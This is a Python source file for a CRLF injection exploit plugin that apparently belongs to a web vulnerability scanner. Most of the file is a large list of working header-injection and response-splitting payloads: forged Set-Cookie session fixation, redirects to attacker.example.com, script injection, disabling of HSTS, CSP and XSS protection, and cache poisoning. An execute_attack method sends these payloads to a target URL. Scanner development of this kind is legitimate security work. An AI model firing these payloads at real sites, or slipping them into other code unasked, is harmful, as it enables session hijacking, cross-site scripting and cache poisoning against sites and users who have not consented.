"""
CRLF Injection Exploit Plugin

Provides exploit capabilities for CRLF Injection vulnerabilities:
- HTTP response splitting
- Header injection via CRLF
- Session fixation via Set-Cookie injection
- XSS via response splitting
"""

import sys
import os
from typing import Dict, List, Any, Optional
from urllib.parse import quote
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_CRLF_PAYLOADS = [
    '%0d%0aSet-Cookie:megido_crlf=1',
    '%0aSet-Cookie:megido_crlf=1',
    '%0d%0aLocation:https://megido.example.com',
    '%0d%0aContent-Length:0%0d%0a%0d%0a<script>alert(1)</script>',
    '\r\nSet-Cookie:megido_crlf=1',
    '\nSet-Cookie:megido_crlf=1',
    '%E5%98%8D%E5%98%8ASet-Cookie:megido_crlf=1',  # Unicode CRLF
    # Response splitting payloads
    '%0d%0a%0d%0a<html><script>alert(1)</script>',
    '%0d%0aX-Injected-Header:megido_test',
    '%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>',
    # Double encoding
    '%250d%250aSet-Cookie:megido_crlf=1',
    '%25%30%64%25%30%61Set-Cookie:megido_crlf=1',
    # Unicode variants
    '\u000d\u000aSet-Cookie:megido_crlf=1',
    '\r\nX-Forwarded-For:127.0.0.1\r\nX-Admin:true',
    # Cache poisoning via CRLF
    '%0d%0aCache-Control:no-cache%0d%0aX-Cache-Poison:1',
    '%0d%0aTransfer-Encoding:chunked%0d%0a%0d%0a0%0d%0a%0d%0a',
    # Header injection for XSS
    '%0d%0aContent-Security-Policy:default-src%20*',
    '%0d%0aX-XSS-Protection:0',
    # Set-Cookie injection variants
    '%0d%0aSet-Cookie:admin=true;Path=/',
    '%0d%0aSet-Cookie:sessionid=megidohijacked;HttpOnly=false',
    '%0d%0aSet-Cookie:megido_crlf=1;domain=.example.com',
    # Newline only variants
    '%0aX-Injected:megido_test',
    '%0aContent-Type:text/html',
    # Mixed encoding
    '%0D%0ASet-Cookie:megido_crlf=1',
    '%0D%0aSet-Cookie:megido_crlf=1',
    '%0d%0ASet-Cookie:megido_crlf=1',
]


class CRLFPlugin(ExploitPlugin):
    """CRLF Injection exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'crlf'

    @property
    def name(self) -> str:
        return 'CRLF Injection Exploit'

    @property
    def description(self) -> str:
        return 'CRLF Injection exploit: HTTP response splitting, header injection, cookie injection.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return CRLF injection payloads."""
        extra_crlf = [
            '%0d%0aSet-Cookie:crlf=injected;Path=/',
            '%0d%0aX-Custom-Header:injected',
            '%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>injected</h1>',
            '%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>response splitting</h1>',
            '%0d%0aRefresh:0;url=http://attacker.example.com',
            '%0d%0aLocation:http://attacker.example.com',
            '%0d%0aSet-Cookie:session=hijacked;HttpOnly;Secure',
            '%0d%0aSet-Cookie:admin=true;Path=/;HttpOnly',
            '%0d%0aX-Forwarded-For:127.0.0.1',
            '%0d%0aX-Real-IP:127.0.0.1',
            '%0d%0aX-Originating-IP:127.0.0.1',
            '%0d%0aX-Remote-Addr:127.0.0.1',
            '%0d%0aAuthorization:Basic YWRtaW46YWRtaW4=',
            '%0d%0aAccess-Control-Allow-Origin:*',
            '%0d%0aAccess-Control-Allow-Credentials:true',
            '%0d%0aContent-Security-Policy:default-src *',
            '%0d%0aX-Frame-Options:ALLOWALL',
            '%0d%0aStrict-Transport-Security:max-age=0',
            # Unicode CRLF variants
            '%c4%8d%c4%8aSet-Cookie:crlf=1',
            '%u000d%u000aSet-Cookie:crlf=1',
            '%E5%98%8D%E5%98%8ASet-Cookie:crlf=2',
            '%E5%98%8D%E5%98%8ALocation:http://attacker.example.com',
            # CR only
            '%0dSet-Cookie:crlf=1',
            '%0dX-Custom:injected',
            '%0d%0d%0aSet-Cookie:crlf=1',
            # LF only
            '%0aX-Custom:injected',
            '%0aSet-Cookie:crlf=2',
            '%0aLocation:http://attacker.example.com',
            # Double encoding
            '%250d%250aSet-Cookie:crlf=1',
            '%250d%250aLocation:http://attacker.example.com',
            '%25%30%64%25%30%61Set-Cookie:crlf=1',
            # Triple encoding
            '%25250d%25250aSet-Cookie:crlf=1',
            # Mixed
            '%0D%0ASet-Cookie:crlf=1',
            '%0D%0aSet-Cookie:crlf=1',
            '%0d%0ASet-Cookie:crlf=1',
            # In different positions
            'foo%0d%0aSet-Cookie:crlf=1',
            'foo%0aSet-Cookie:crlf=1',
            'foo%0dSet-Cookie:crlf=1',
            '/../%0d%0aSet-Cookie:crlf=1',
            '/redirect?url=/%0d%0aSet-Cookie:crlf=1',
            # Header value injection
            'value%0d%0aX-Injected:test',
            'value%0aX-Injected:test',
            # Null byte + CRLF
            '%00%0d%0aSet-Cookie:crlf=1',
            # Tab + CRLF
            '%09%0d%0aSet-Cookie:crlf=1',
            # CRLF in cookie name
            'Set-Cookie:crlf%0d%0a=1',
            # Response injection payloads
            '%0d%0a%0d%0a<script>alert(1)</script>',
            '%0a%0a<script>alert(1)</script>',
            '\r\nContent-Length:0\r\n\r\n',
            '\r\nTransfer-Encoding:chunked\r\n\r\n0\r\n\r\n',
        ]
        # Generate dynamic CRLF payloads for different headers
        inject_headers = [
            'Set-Cookie', 'Location', 'Content-Type', 'Content-Length',
            'X-Custom-Header', 'X-Forwarded-For', 'Access-Control-Allow-Origin',
            'Content-Security-Policy', 'X-Frame-Options', 'X-XSS-Protection',
            'Strict-Transport-Security', 'Cache-Control', 'Pragma',
        ]
        crlf_variants = [
            '%0d%0a', '%0a', '%0d', '%0D%0A', '%0D%0a', '%0d%0A',
            '%E5%98%8D%E5%98%8A', '%c4%8d%c4%8a', '%u000d%u000a',
            '\r\n', '\n', '\r',
            '%250d%250a', '%25%30%64%25%30%61',
        ]
        dynamic_crlf = []
        for crlf in crlf_variants:
            for hdr in inject_headers:
                dynamic_crlf.append(f'foo{crlf}{hdr}:injected_by_megido')
                dynamic_crlf.append(f'foo{crlf}{hdr}: injected_value_test')
        all_payloads = list(_CRLF_PAYLOADS) + extra_crlf + dynamic_crlf
        return PayloadMutator.scale_payloads_to_minimum(all_payloads)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Test CRLF injection by injecting payloads and checking response headers."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'crlf',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        parameter = vulnerability_data.get('parameter', 'url')

        for payload in _CRLF_PAYLOADS:
            try:
                if '?' in target_url:
                    test_url = f"{target_url}&{parameter}={payload}"
                else:
                    test_url = f"{target_url}?{parameter}={payload}"

                resp = requests.get(test_url, timeout=timeout, verify=verify_ssl,
                                    allow_redirects=False)

                # Check if injected header appears in response
                if 'megido_crlf' in str(resp.headers) or 'megido_crlf' in resp.text:
                    return {
                        'success': True,
                        'vulnerability_type': 'crlf',
                        'payload': payload,
                        'evidence': f'Injected header reflected in response headers or body',
                        'response_headers': dict(resp.headers),
                        'message': 'CRLF injection confirmed â€” header injection successful',
                    }
            except Exception as e:
                logger.debug(f"CRLF test error (payload={payload!r}): {e}")

        return {
            'success': False,
            'error': 'No CRLF injection vulnerability confirmed',
            'vulnerability_type': 'crlf',
        }
